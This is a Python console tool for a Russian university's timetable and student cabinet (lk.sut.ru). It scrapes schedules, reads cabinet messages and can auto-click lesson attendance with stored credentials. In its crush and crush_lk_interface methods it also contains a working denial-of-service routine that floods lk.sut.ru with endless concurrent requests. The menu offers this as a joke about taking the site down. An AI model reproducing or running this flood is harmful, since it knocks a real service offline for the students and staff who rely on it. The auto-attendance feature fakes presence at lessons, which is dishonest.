import os, json, aiohttp, asyncio, threading, re
from bs4 import BeautifulSoup
from datetime import datetime, timedelta, time
from tqdm.asyncio import tqdm_asyncio
from time import sleep
import html

if os.name=='nt': import msvcrt
else: import sys, fcntl, termios

class BonchAPI:
    def __init__(self, first_day: str, limit: int = 80):
        self.first_day = datetime.strptime(first_day, '%Y-%m-%d')
        self.set_current_week()
        self.limit = limit
        self.days_of_week_str_to_int = {'Понедельник': 0, 'Вторник': 1, 'Среда': 2, 'Четверг': 3, 'Пятница': 4, 'Суббота': 5}
        self.days_of_week = ['Понедельник', 'Вторник', 'Среда', 'Четверг', 'Пятница', 'Суббота']

    async def login(self, email: str, password: str) -> bool:
        AUTH = f'https://lk.sut.ru/cabinet/lib/autentificationok.php?users={email}&parole={password}'
        CABINET = 'https://lk.sut.ru/cabinet/'
        
        try:
            async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(10)) as session:
                async with session.get(f'{CABINET}?login=no') as response:
                    response.raise_for_status()
                    self.cookies = response.cookies
                    async with session.post(AUTH) as response:
                        response.raise_for_status()
                        text = await response.text()
                        if text == '1':
                            async with session.get(f'{CABINET}?login=yes') as response:
                                response.raise_for_status()
                                return True
                        else:
                            return False
        except Exception as e:
            return False

    async def auto_click(self, email: str, password: str, timeout: int = 15):
        URL = 'https://lk.sut.ru/cabinet/project/cabinet/forms/raspisanie.php'
        ERR_MSG = 'У Вас нет прав доступа. Или необходимо перезагрузить приложение..'

        response = False
        while not response:
            response = await self.login(email, password)

        while True:
            try:
                async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(10)) as session:
                    async with session.get(URL, cookies=self.cookies) as response:
                        response.raise_for_status()
                        text = await response.text()
                        if text == ERR_MSG:
                            response = False
                            while not response:
                                response = await self.login(email, password)
                            continue

                        soup = BeautifulSoup(text, 'html.parser')
                        week = soup.find('h3').text.split('№')[1].split()[0]
                        knop_ids = tuple(x['id'][4:] for x in soup.find_all('span') if x.get('id', '').startswith('knop'))

                        for lesson_id in knop_ids:
                            async with session.post(f'{URL}?open=1&rasp={lesson_id}&week={week}', cookies=self.cookies) as response:
                                pass
            except Exception as e:
                pass
            finally:
                sleep(timeout)

    def set_current_week(self):
        today = datetime.now()
        if today < self.first_day:
            self.cur_week = 0
        else:
            cur_day = self.first_day
            self.cur_week = 0
            while today > cur_day:
                self.cur_week += 1
                cur_day = cur_day + timedelta(days=7)
            cur_day = cur_day - timedelta(days=7)
            self.cur_week -= 1

    async def get_schet(self):
        URL = 'https://cabinet.sut.ru/raspisanie_all_new'

        async with aiohttp.ClientSession() as session:
            async with session.get(URL) as response:
                text = await response.text()
                soup = BeautifulSoup(text, 'html.parser')
                schet_option = soup.find('select', id='schet')
                self.schet = schet_option.find('option', selected=True)['value']

    async def get_groups(self):
        URL = 'https://www.sut.ru/studentu/raspisanie/raspisanie-zanyatiy-studentov-ochnoy-i-vecherney-form-obucheniya'

        async with aiohttp.ClientSession() as session:
            async with session.get(URL) as response:
                response.raise_for_status()
                html = await response.text()
                soup = BeautifulSoup(html, 'html.parser')
                groups = soup.find_all('a', class_='vt256')
                self.groups_id = {group['href'].split('=')[-1]: group['data-nm'] for group in groups}

    async def get_timetable(self, session: aiohttp.ClientSession, type_z: str, group_id: str) -> list:
        URL = f'https://cabinet.sut.ru/raspisanie_all_new.php?schet={self.schet}&type_z={type_z}&group={group_id}'

        try:
            async with session.get(URL) as response:
                text = await response.text()

                soup = BeautifulSoup(text, 'html.parser')
                table = soup.find('table', class_='simple-little-table')
                if not table:
                    # Логируем для отладки
                    if group_id == '56252':
                        print(f"DEBUG: Группа {group_id} - таблица не найдена. HTML длина: {len(text)}")
                    return 'Расписание не найдено'

                timetable_data = []
                rows = table.find('tbody').find_all('tr')[1:]
                
                # Логируем для отладки
                if group_id == '56252':
                    print(f"DEBUG: Группа {group_id} - найдено строк: {len(rows)}")

                for row in rows:
                    cells = row.find_all('td')
                    if not cells:
                        continue

                    lesson_number_cell = cells[0]
                    lesson_number_text = lesson_number_cell.text.strip()
                    lesson_number_parts = lesson_number_text.split()
                    lesson_number = lesson_number_parts[0] if lesson_number_parts else None

                    lesson_time = None
                    if lesson_number == '7':
                        lesson_time = '20:00-21:35'
                    elif len(lesson_number_parts) > 1:
                        lesson_time = lesson_number_parts[1][1:-1]

                    for day_index, cell in enumerate(cells[1:]):
                        pair_divs = cell.find_all('div', class_='pair')
                        if not pair_divs:
                            continue

                        day_name = self.days_of_week[day_index]
                        day_of_week_int = self.days_of_week_str_to_int[day_name]

                        for pair_div in pair_divs:
                            subject_element = pair_div.find('span', class_='subect')
                            subject = subject_element.strong.text.strip() if subject_element and subject_element.strong else None

                            type_element = pair_div.find('span', class_='type')
                            lesson_type = type_element.text.strip('()') if type_element else None

                            teacher_element = pair_div.find('span', class_='teacher')
                            teacher = teacher_element.text.strip() if teacher_element else None

                            room_element = pair_div.find('span', class_='aud')
                            room = room_element.text.split(':')[1].strip().replace('; Б22', '') if room_element and ':' in room_element.text else None

                            weeks_element = pair_div.find('span', class_='weeks')
                            week_number_str = weeks_element.text.strip('()').replace('н', '').replace('*', '') if weeks_element else None

                            # Инициализируем weeks_list пустым списком по умолчанию
                            weeks_list = []
                            if week_number_str:
                                weeks_list = [week.strip() for week in week_number_str.split(',') if week.strip()]

                            # Обрабатываем только если есть недели
                            if weeks_list:
                                for week_str in weeks_list:
                                    try:
                                        week_number = int(week_str)
                                        lesson_date = self.first_day + timedelta(days=week_number * 7 + day_of_week_int)

                                        timetable_data.append({
                                            'Группа': self.groups_id[group_id],
                                            'Число': lesson_date.strftime('%Y.%m.%d'),
                                            'День недели': day_name,
                                            'Номер недели': week_number,
                                            'Номер дня недели': day_of_week_int,
                                            'Номер занятия': lesson_number,
                                            'Время занятия': lesson_time,
                                            'Предмет': subject,
                                            'Тип занятия': lesson_type,
                                            'ФИО преподавателя': teacher,
                                            'Номер кабинета': room,
                                        })
                                    except (ValueError, TypeError):
                                        # Пропускаем некорректные номера недель
                                        continue
                
                # Логируем для отладки
                if group_id == '56252':
                    print(f"DEBUG: Группа {group_id} - итого занятий: {len(timetable_data)}")
                
                return sorted(timetable_data, key=lambda x: (x['Номер недели'], x['Номер дня недели']))
        except Exception as e:
            return 'Ошибка сервера'

    async def all_groups_timetable(self) -> dict:
        start = datetime.now()
        
        await self.get_schet()
        await self.get_groups()
        
        timetable = {}
        group_items = list(self.groups_id.items())
        connector = aiohttp.TCPConnector(limit=self.limit)
        async with aiohttp.ClientSession(connector=connector) as session:
            tasks = [self.get_timetable(session, '1', group_id) for group_id, _ in group_items]
            results = await tqdm_asyncio.gather(*tasks, desc='Загрузка групп', unit=' Групп',
                bar_format='{l_bar}{bar}| {n_fmt}/{total_fmt} | {rate_fmt}{postfix}')
            timetable = {group_name: results[index] for index, (_, group_name) in enumerate(group_items) if not isinstance(results[index], str)}
        self.save_to_json(timetable)
        end = datetime.now()
        print(f'Всего групп получено: {len(timetable)}')
        print(f'Потрачено времени: {(end - start).total_seconds()} секунд\n')
        return timetable

    @staticmethod
    def parse_lesson_time(time_str) -> datetime:
        if not time_str: return time(0, 0)
        start_time_str = time_str.split('-')[0]
        try: return datetime.strptime(start_time_str, '%H:%M').time()
        except ValueError: return time(0, 0)

    @staticmethod
    def teacher_timetable(timetable: dict, teacher: str) -> list:
        teacher_lessons = []
        for _, lessons in timetable.items():
            for lesson in lessons:
                if lesson['ФИО преподавателя'] and teacher in lesson['ФИО преподавателя']:
                    teacher_lessons.append(lesson)

        return sorted(teacher_lessons, key=lambda x: (x['Номер недели'], x['Номер дня недели'], BonchAPI.parse_lesson_time(x['Время занятия'])))

    @staticmethod
    def classroom_timetable(timetable: dict, classroom: str) -> list:
        classroom_lessons = []
        for _, lessons in timetable.items():
            for lesson in lessons:
                if lesson['Номер кабинета'] and classroom in lesson['Номер кабинета']:
                    classroom_lessons.append(lesson)

        return sorted(classroom_lessons, key=lambda x: (x['Номер недели'], x['Номер дня недели'], BonchAPI.parse_lesson_time(x['Время занятия'])))

    @staticmethod
    def format_output(timetable: list, week_number: int = None) -> str:
        output = ''

        if not timetable:
            output += 'Нет занятий для отображения\n'
            return output

        lessons_by_week = {}
        if week_number is None:
            for lesson in timetable:
                week = lesson['Номер недели']
                if week not in lessons_by_week:
                    lessons_by_week[week] = []
                lessons_by_week[week].append(lesson)
        else:
            lessons_by_week[week_number] = [lesson for lesson in timetable if lesson['Номер недели'] == week_number]
            if not lessons_by_week[week_number]:
                output += f'Нет занятий для недели {week_number}\n'
                return output

        for week, week_lessons in lessons_by_week.items():
            output += f'Неделя №{week}\n\n'

            grouped_lessons = {}
            for lesson in week_lessons:
                key = (lesson['Число'], lesson['Номер занятия'], lesson['Предмет'], lesson['Номер кабинета'])
                if key not in grouped_lessons:
                    grouped_lessons[key] = {
                        'Число': lesson['Число'],
                        'День недели': lesson['День недели'],
                        'Время занятия': lesson['Время занятия'],
                        'Номер занятия': lesson['Номер занятия'],
                        'Предмет': lesson['Предмет'],
                        'Группы': {lesson['Группа']},
                        'Преподаватели': set(),
                        'Тип занятия': lesson.get('Тип занятия', ''),
                        'Номер кабинета': lesson['Номер кабинета'],
                    }

                    teacher_string = lesson.get('ФИО преподавателя', '')
                    if teacher_string:
                        teachers = [t.strip() for t in teacher_string.split(';')]
                        for teacher in teachers:
                            grouped_lessons[key]['Преподаватели'].add(teacher)
                    else:
                        grouped_lessons[key]['Преподаватели'] = set()

                else:
                    grouped_lessons[key]['Группы'].add(lesson['Группа'])

                    teacher_string = lesson.get('ФИО преподавателя', '')
                    if teacher_string:
                        teachers = [t.strip() for t in teacher_string.split(';')]
                        for teacher in teachers:
                            grouped_lessons[key]['Преподаватели'].add(teacher)

            lessons_list = list(grouped_lessons.values())
            lessons_list.sort(key=lambda x: (x['Число'], BonchAPI.parse_lesson_time(x['Время занятия'])))

            if lessons_list:
                prev_day = lessons_list[0]['Число']
                day_of_week = lessons_list[0]['День недели']
                output += f'{prev_day} | {day_of_week}\n\n'

                for lesson in lessons_list:
                    cur_day = lesson['Число']
                    if cur_day != prev_day:
                        day_of_week = lesson['День недели']
                        prev_day = cur_day
                        output += f'{prev_day} | {day_of_week}\n\n'

                    lesson_time = lesson['Время занятия']
                    lesson_number = lesson['Номер занятия']
                    subject = lesson['Предмет']
                    groups = ', '.join(sorted(lesson['Группы']))
                    lesson_type = lesson.get('Тип занятия', '')
                    teachers = '; '.join(sorted(lesson['Преподаватели']))
                    room = lesson['Номер кабинета']

                    output += f'{lesson_time}\n'
                    output += f'{lesson_number}. {subject} | {groups}\n'
                    if lesson_type: output += f'{lesson_type}\n'
                    if teachers: output += f'{teachers}\n'
                    if room: output += f'{room}\n'
                    output += '\n'
            else:
                output += "Нет занятий на этой неделе\n\n"

        output = output[:-1]
        return output

    @staticmethod
    def save_to_json(timetable: dict, filepath: str = 'timetable.json'):
        try:
            with open(filepath, 'w', encoding='utf-8') as f:
                json.dump(timetable, f, indent=4, ensure_ascii=False)
            print(f'Расписание сохранено в файл: {filepath}\n')
        except Exception as e:
            print(f'Ошибка при сохранении расписания в файл: {e}\n')

    @staticmethod
    def load_from_json(filepath: str = 'timetable.json') -> dict:
        try:
            with open(filepath, 'r', encoding='utf-8') as f:
                timetable = json.load(f)
            print(f'Расписание загружено из файла: {filepath}\n')
            return timetable
        except Exception as e:
            print(f'Ошибка при загрузке расписания из файла: {e}\n')
            return None

    @staticmethod
    def cls():
        os.system('cls' if os.name=='nt' else 'clear')

    @staticmethod
    def wait_key() -> bytes:
        if os.name == 'nt':
            return msvcrt.getch()
        else:
            fd = sys.stdin.fileno()
            flags_save = fcntl.fcntl(fd, fcntl.F_GETFL)
            attrs_save = termios.tcgetattr(fd)
            attrs = list(attrs_save)
            attrs[0] &= ~(termios.IGNBRK | termios.BRKINT | termios.PARMRK
                        | termios.ISTRIP | termios.INLCR | termios.IGNCR
                        | termios.ICRNL | termios.IXON)
            attrs[1] &= ~termios.OPOST
            attrs[2] &= ~(termios.CSIZE | termios.PARENB)
            attrs[2] |= termios.CS8
            attrs[3] &= ~(termios.ECHONL | termios.ECHO | termios.ICANON
                        | termios.ISIG | termios.IEXTEN)
            termios.tcsetattr(fd, termios.TCSANOW, attrs)
            fcntl.fcntl(fd, fcntl.F_SETFL, flags_save & ~os.O_NONBLOCK)
            ret = []
            try:
                ret.append(sys.stdin.read(1))
                fcntl.fcntl(fd, fcntl.F_SETFL, flags_save | os.O_NONBLOCK)
                c = sys.stdin.read(1)
                while len(c) > 0:
                    ret.append(c)
                    c = sys.stdin.read(1)
            except KeyboardInterrupt:
                ret.append('\x03')
            finally:
                termios.tcsetattr(fd, termios.TCSAFLUSH, attrs_save)
                fcntl.fcntl(fd, fcntl.F_SETFL, flags_save)
            return bytes(''.join(ret), encoding='utf-8')

    def timetable_interface(self, timetable: dict):
        self.cls()
        inp = b'-'
        self.change_group_name(timetable, self.group_name)
        while inp != b'\x1b':
            print(f'Расписание группы: {self.group_name}\n')
            print(self.format_output(timetable[self.group_name], self.cur_week))
            print(f'Текущая неделя: {self.cur_week}')
            print('[>] - следующая неделя')
            print('[<] - предыдущая неделя')
            print('[Esc] - выйти')
            inp = self.wait_key()
            self.cls()
            if inp in [b'K', b'\x1b[D']: self.cur_week = self.cur_week - 1 if self.cur_week > 0 else self.cur_week
            elif inp in [b'M', b'\x1b[C']: self.cur_week = self.cur_week + 1 if self.cur_week < 50 else self.cur_week
        self.set_current_week()

    def teacher_timetable_interface(self, timetable: dict, teacher: str):
        self.cls()
        inp = b'-'
        while inp != b'\x1b':
            print(f'Расписание преподавателя: {teacher}\n')
            teacher_timetable = self.teacher_timetable(timetable, teacher)
            print(self.format_output(teacher_timetable, self.cur_week))
            print(f'Текущая неделя: {self.cur_week}')
            print('[>] - следующая неделя')
            print('[<] - предыдущая неделя')
            print('[Esc] - выйти')
            inp = self.wait_key()
            self.cls()
            if inp in [b'K', b'\x1b[D']: self.cur_week = self.cur_week - 1 if self.cur_week > 0 else self.cur_week
            elif inp in [b'M', b'\x1b[C']: self.cur_week = self.cur_week + 1 if self.cur_week < 50 else self.cur_week
        self.set_current_week()

    def classroom_timetable_interface(self, timetable: dict, classroom: str):
        self.cls()
        inp = b'-'
        while inp != b'\x1b':
            print(f'Расписание кабинета: {classroom}\n')
            classroom_timetable = self.classroom_timetable(timetable, classroom)
            print(self.format_output(classroom_timetable, self.cur_week))
            print(f'Текущая неделя: {self.cur_week}')
            print('[>] - следующая неделя')
            print('[<] - предыдущая неделя')
            print('[Esc] - выйти')
            inp = self.wait_key()
            self.cls()
            if inp in [b'K', b'\x1b[D']: self.cur_week = self.cur_week - 1 if self.cur_week > 0 else self.cur_week
            elif inp in [b'M', b'\x1b[C']: self.cur_week = self.cur_week + 1 if self.cur_week < 50 else self.cur_week
        self.set_current_week()

    async def messages_interface(self):
        """Интерфейс для просмотра сообщений"""
        if not hasattr(self, 'email') or not hasattr(self, 'password'):
            print('Для просмотра сообщений требуются login и password в конфигурации\n')
            input('Нажмите Enter для продолжения...')
            return
        
        # Авторизация
        response = False
        while not response:
            response = await self.login(self.email, self.password)
            if not response:
                print('Ошибка авторизации. Проверьте логин и пароль.\n')
                input('Нажмите Enter для продолжения...')
                return
        
        self.cls()
        messages = await self.get_messages()
        
        if not messages:
            print('Нет входящих сообщений\n')
            input('Нажмите Enter для продолжения...')
            return
        
        selected_index = 0
        inp = b'-'
        
        while inp != b'\x1b':
            self.cls()
            print('Входящие сообщения:\n')
            for i, msg in enumerate(messages):
                marker = '>>>' if i == selected_index else '   '
                unread_marker = ' [НЕПРОЧИТАНО]' if msg.get('is_unread', False) else ''
                files_marker = ' [ФАЙЛЫ]' if msg.get('has_files', False) else ''
                date = msg.get('date', '')[:10] if msg.get('date') else ''
                sender_short = msg.get('sender', '')[:30] if msg.get('sender') else ''
                if sender_short and '(' in sender_short:
                    sender_short = sender_short.split('(')[0].strip()
                
                title = msg.get('title', 'Без названия')[:50]
                if len(msg.get('title', '')) > 50:
                    title += '...'
                
                print(f'{marker} [{i+1}] {date} | {sender_short}')
                print(f'     {title}{unread_marker}{files_marker}')
                if i < len(messages) - 1:
                    print()
            
            print('\n[Enter] - открыть сообщение')
            print('[↑/↓ или k/j] - выбрать сообщение')
            print('[Esc] - выйти')
            
            inp = self.wait_key()
            
            if inp == b'\r' or inp == b'\n':  # Enter
                if 0 <= selected_index < len(messages):
                    message_id = messages[selected_index]['id']
                    self.cls()
                    print('Загрузка сообщения...\n')
                    message = await self.get_message(message_id)
                    
                    if message:
                        self.cls()
                        selected_msg = messages[selected_index]
                        print('=' * 80)
                        print(f'Название: {message.get("name", selected_msg.get("title", "Без названия"))}')
                        print('=' * 80)
                        print(f'Дата: {selected_msg.get("date", "Не указана")}')
                        print(f'Отправитель: {selected_msg.get("sender", "Неизвестно")}')
                        print('-' * 80)
                        annotation = message.get("annotation", "Нет текста")
                        # Удаляем HTML теги и декодируем сущности
                        if annotation:
                            annotation = html.unescape(annotation)
                            # Простое удаление HTML тегов
                            annotation = re.sub(r'<[^>]+>', '', annotation)
                        print(f'\n{annotation}\n')
                        print('-' * 80)
                        if selected_msg.get("files"):
                            print('Файлы:')
                            for file_info in selected_msg["files"]:
                                print(f'  - {file_info.get("name", "Файл")}')
                                if file_info.get("url"):
                                    print(f'    URL: {file_info["url"]}')
                        elif message.get("files"):
                            print(f'Файлы: {message.get("files")}')
                        print('-' * 80)
                        print(f'ID: {message.get("id", message_id)}')
                        print(f'Тип документа: {message.get("viddok", "Не указан")}')
                        print('=' * 80)
                    else:
                        print('Не удалось загрузить сообщение\n')
                    
                    input('\nНажмите Enter для продолжения...')
            
            elif (inp in [b'K', b'\x1b[D', b'\x1b[A']) or (inp == b'k'):  # Стрелка вверх или 'k'
                selected_index = max(0, selected_index - 1)
            elif (inp in [b'M', b'\x1b[C', b'\x1b[B']) or (inp == b'j'):  # Стрелка вниз или 'j'
                selected_index = min(len(messages) - 1, selected_index + 1)

    def change_group_name(self, timetable: dict, group_name: str):
        if group_name in timetable: self.group_name = group_name
        elif self.group_name not in timetable: self.group_name = next(iter(timetable.keys()))

    async def get_messages(self) -> list:
        """Получить список входящих сообщений со всех страниц"""
        BASE_URL = 'https://lk.sut.ru/cabinet/project/cabinet/forms/message.php'
        
        if not hasattr(self, 'cookies'):
            if not hasattr(self, 'email') or not hasattr(self, 'password'):
                print("DEBUG: Нет cookies и нет email/password")
                return []
            response = False
            while not response:
                response = await self.login(self.email, self.password)
        
        try:
            async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(10)) as session:
                # Добавляем заголовки, чтобы имитировать браузер
                headers = {
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                    'Accept-Language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
                    'Accept-Encoding': 'gzip, deflate, br',
                    'Referer': 'https://lk.sut.ru/cabinet/',
                    'Connection': 'keep-alive',
                    'Upgrade-Insecure-Requests': '1'
                }
                
                # Сначала заходим на главную страницу кабинета для инициализации сессии
                cabinet_url = 'https://lk.sut.ru/cabinet/'
                async with session.get(cabinet_url, cookies=self.cookies, headers=headers) as cab_response:
                    cab_response.raise_for_status()
                
                # Загружаем первую страницу для определения общего количества страниц
                first_page_url = f'{BASE_URL}?type=in'
                async with session.get(first_page_url, cookies=self.cookies, headers=headers) as response:
                    response.raise_for_status()
                    text = await response.text()
                    
                    # Если получили ошибку PHP, возвращаем пустой список
                    if 'ERRNO:' in text or 'Undefined index' in text:
                        print("DEBUG: Обнаружена ошибка PHP на первой странице")
                        return []
                    
                    soup = BeautifulSoup(text, 'html.parser')
                    
                    # Определяем общее количество страниц
                    # Ищем информацию о пагинации (например, "1-20 из 658")
                    total_pages = 1
                    pagination_info = soup.find('center')
                    if pagination_info:
                        pagination_text = pagination_info.get_text()
                        # Ищем паттерн типа "1-20 из 658" или ссылки на последнюю страницу
                        import re
                        # Ищем ссылку на последнюю страницу типа ">>" или номер последней страницы
                        last_page_link = pagination_info.find('a', onclick=lambda x: x and 'page=' in str(x) and '>>' in str(x) if x else False)
                        if last_page_link:
                            # Извлекаем номер страницы из onclick
                            onclick = last_page_link.get('onclick', '')
                            page_match = re.search(r'page=(\d+)', onclick)
                            if page_match:
                                total_pages = int(page_match.group(1))
                        else:
                            # Пытаемся найти из текста "1-20 из 658"
                            match = re.search(r'(\d+)-(\d+)\s+из\s+(\d+)', pagination_text)
                            if match:
                                total_items = int(match.group(3))
                                items_per_page = 20
                                total_pages = (total_items + items_per_page - 1) // items_per_page
                    
                    print(f"DEBUG: Найдено страниц: {total_pages}")
                    
                    # Собираем сообщения со всех страниц
                    all_messages = []
                    
                    for page in range(1, total_pages + 1):
                        if page == 1:
                            # Первую страницу уже загрузили
                            page_text = text
                        else:
                            # Загружаем остальные страницы
                            page_url = f'{BASE_URL}?page={page}&type=in'
                            async with session.get(page_url, cookies=self.cookies, headers=headers) as page_response:
                                page_response.raise_for_status()
                                page_text = await page_response.text()
                                
                                if 'ERRNO:' in page_text or 'Undefined index' in page_text:
                                    print(f"DEBUG: Ошибка на странице {page}, пропускаем")
                                    continue
                        
                        page_soup = BeautifulSoup(page_text, 'html.parser')
                        
                        # Ищем таблицу с сообщениями
                        table = page_soup.find('table', id='mytable')
                        if not table:
                            print(f"DEBUG: Таблица не найдена на странице {page}")
                            continue
                        
                        # Ищем все строки с id начинающимся с "tr_"
                        rows = table.find_all('tr', id=lambda x: x and x.startswith('tr_'))
                        print(f"DEBUG: Страница {page}: найдено {len(rows)} сообщений")
                        
                        for row in rows:
                            try:
                                # Извлекаем ID из id атрибута (tr_3737509 -> 3737509)
                                row_id = row.get('id', '')
                                if not row_id.startswith('tr_'):
                                    continue
                                
                                message_id = row_id.replace('tr_', '')
                                
                                # Извлекаем данные из ячеек
                                cells = row.find_all('td')
                                if len(cells) < 4:
                                    continue
                                
                                # Дата из первой ячейки
                                date_cell = cells[0]
                                date_text = date_cell.get_text(strip=True)
                                
                                # Тема из второй ячейки (пропускаем изображение)
                                theme_cell = cells[1]
                                
                                # Используем stripped_strings - это дает все текстовые узлы, игнорируя теги
                                # Это работает даже если текст находится после img тега
                                text_parts = list(theme_cell.stripped_strings)
                                
                                # Фильтруем - убираем пустые строки и текст, который может быть в атрибутах
                                filtered_parts = []
                                for part in text_parts:
                                    part = part.strip()
                                    # Пропускаем очень короткие строки, которые могут быть артефактами
                                    if part and len(part) > 1:
                                        filtered_parts.append(part)
                                
                                # Объединяем части
                                title = ' '.join(filtered_parts).strip() if filtered_parts else ''
                                
                                if not title:
                                    title = 'Без названия'
                                
                                # Файлы из третьей ячейки
                                files_cell = cells[2]
                                files = []
                                for file_link in files_cell.find_all('a', href=True):
                                    file_name = file_link.get_text(strip=True)
                                    file_url = file_link.get('href', '')
                                    if file_name:
                                        files.append({'name': file_name, 'url': file_url})
                                
                                # Отправитель из четвертой ячейки
                                sender_cell = cells[3]
                                sender = sender_cell.get_text(strip=True) or 'Неизвестно'
                                
                                # Проверяем, является ли сообщение непрочитанным (жирный шрифт)
                                row_style = row.get('style', '')
                                is_unread = 'font-weight: bold' in row_style or 'font-weight:bold' in row_style.replace(' ', '')
                                
                                all_messages.append({
                                    'id': message_id,
                                    'title': title,
                                    'date': date_text,
                                    'sender': sender,
                                    'files': files,
                                    'has_files': len(files) > 0,
                                    'is_unread': is_unread
                                })
                            except Exception as e:
                                print(f"DEBUG: Ошибка при парсинге строки на странице {page}: {e}")
                                continue
                    
                    print(f"DEBUG: Итого найдено сообщений со всех страниц: {len(all_messages)}")
                    return all_messages
        except Exception as e:
            print(f'Ошибка при получении сообщений: {e}')
            import traceback
            traceback.print_exc()
            return []

    async def get_message(self, message_id: str) -> dict:
        """Получить конкретное сообщение по ID"""
        URL = 'https://lk.sut.ru/cabinet/project/cabinet/forms/sendto2.php'
        
        if not hasattr(self, 'cookies'):
            if not hasattr(self, 'email') or not hasattr(self, 'password'):
                return {}
            response = False
            while not response:
                response = await self.login(self.email, self.password)
        
        try:
            async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(10)) as session:
                data = {
                    'id': message_id,
                    'prosmotr': ''
                }
                async with session.post(URL, cookies=self.cookies, data=data) as response:
                    response.raise_for_status()
                    text = await response.text()
                    
                    # Парсим JSON ответ
                    try:
                        message_data = json.loads(text)
                        # Декодируем HTML сущности в текстовых полях
                        if 'annotation' in message_data:
                            message_data['annotation'] = html.unescape(message_data['annotation'])
                        if 'name' in message_data:
                            message_data['name'] = html.unescape(message_data['name'])
                        return message_data
                    except json.JSONDecodeError:
                        # Если это не JSON, пытаемся парсить HTML
                        soup = BeautifulSoup(text, 'html.parser')
                        message_data = {
                            'id': message_id,
                            'annotation': '',
                            'name': '',
                            'viddok': '',
                            'otvet': 0,
                            'idinfo': 0,
                            'files': '',
                            'sendto': message_id,
                            'otpr': 0,
                            'history': 0
                        }
                        
                        # Пытаемся извлечь данные из HTML
                        name_elem = soup.find('input', {'name': 'name'}) or soup.find('h2') or soup.find('h3')
                        if name_elem:
                            message_data['name'] = name_elem.get('value', '') or name_elem.text.strip()
                        
                        annotation_elem = soup.find('textarea', {'name': 'annotation'}) or soup.find('div', class_='annotation')
                        if annotation_elem:
                            message_data['annotation'] = annotation_elem.get('value', '') or annotation_elem.text.strip()
                        
                        return message_data
        except Exception as e:
            print(f'Ошибка при получении сообщения: {e}')
            return {}

    async def crush_request(self, session: aiohttp.ClientSession, type_z: str, group_id: str):
        URL = f'https://lk.sut.ru/cabinet/project/cabinet/forms/raspisanie_all.php?schet={self.schet}&type_z={type_z}&group={group_id}'
        try:
            async with session.get(URL, cookies=self.cookies) as response:
                return response.status
        except Exception as e:
            return 'Ошибка подключения'
    
    async def crush(self, limit: int = 100):
        response = False
        while not response:
            response = await self.login(self.email, self.password)

        await self.get_schet()
        await self.get_groups()

        group_items = list(self.groups_id.items())
        connector = aiohttp.TCPConnector(limit=limit)
        while True:
            try:
                async with aiohttp.ClientSession(connector=connector) as session:
                    tasks = [self.crush_request(session, '1', group_id) for group_id, _ in group_items]
                    await asyncio.gather(*tasks)
            except Exception as e:
                pass

    def crush_lk_interface(self, limit: int = 100):
        if hasattr(self, 'email') and hasattr(self, 'password'):
            thread = threading.Thread(
                target=lambda: asyncio.run(self.crush(limit)),
                daemon=True
            )
            thread.start()
            print('Атака на lk.sut запущена\n')
        else:
            print('Для атаки требуются login и password в конфигурации\n')

    @classmethod
    def read_options(cls, filename: str = 'options.txt') -> 'BonchAPI':
        options = {}
        
        with open(filename, 'r', encoding='utf-8') as file:
            for line in file:
                clean_line = line.split('#')[0].strip()
                if not clean_line or '=' not in clean_line: continue
                key, value = clean_line.split('=', 1)
                options[key.strip()] = value.strip()

        if 'first_day' not in options:
            raise ValueError('Не указан обязательный параметр first_day в файле конфигурации')

        instance = cls(
            first_day=options['first_day'],
            limit=int(options.get('limit', 80))
        )

        if 'login' in options and 'password' in options:
            instance.email = options['login']
            instance.password = options['password']

        if options.get('auto-visit', 'False').lower() == 'true':
            if 'login' in options and 'password' in options:
                thread = threading.Thread(
                    target=lambda: asyncio.run(instance.auto_click(options['login'], options['password'])),
                    daemon=True
                )
                thread.start()
            else:
                print('Для авто-посещения требуются login и password в конфигурации\n')

        if 'group_name' in options:
            instance.group_name = options['group_name']

        return instance

async def main():
    '''
        Укажите в файле options.txt:

        # Обязательные параметры
        first_day=2025-02-03   # Первый день семестра

        # Опциональные параметры
        group_name=ИКПИ-22     # Ваша группа
        limit=20               # Количество одновременных запросов
        auto-visit=True        # Вкл/Выкл автопосещение
        login=your_login       # Логин для автопосещения
        password=your_password # Пароль для автопосещения
    '''

    api = BonchAPI.read_options()

    while True:
        timetable = None
        while timetable is None:
            print('[1] - получить расписание из sut.ru')
            print('[2] - получить расписание из timetable.json')
            print('[Esc] - выйти')
            inp = BonchAPI.wait_key()
            BonchAPI.cls()
            if inp == b'1': timetable = await api.all_groups_timetable()
            elif inp == b'2': timetable = BonchAPI.load_from_json()
            elif inp == b'\x1b': exit(0)

        inp = b'-'
        api.change_group_name(timetable, api.group_name)
        while inp != b'\x1b':
            print(f'Текущая неделя: {api.cur_week}\n')
            print(f'[1] - получить расписание группы')
            print(f'[2] - получить расписание преподавателя')
            print(f'[3] - получить расписание кабинета')
            print(f'[4] - изменить группу (текущая: {api.group_name})')
            print(f'[5] - положить lk.sut (ахаха)')
            print(f'[6] - просмотр сообщений')
            print(f'[Esc] - выйти')
            inp = BonchAPI.wait_key()
            BonchAPI.cls()
            if inp == b'1':
                api.timetable_interface(timetable)
            elif inp == b'2':
                teacher = input('Фамилия (И.О.) преподавателя: ')
                api.teacher_timetable_interface(timetable, teacher)
            elif inp == b'3':
                classroom = input('Номер кабинета: ')
                api.classroom_timetable_interface(timetable, classroom)
            elif inp == b'4':
                group_name = input('Название группы: ')
                api.change_group_name(timetable, group_name)
                BonchAPI.cls()
            elif inp == b'5':
                api.crush_lk_interface()
            elif inp == b'6':
                await api.messages_interface()
                BonchAPI.cls()

if __name__ == '__main__':
    asyncio.run(main())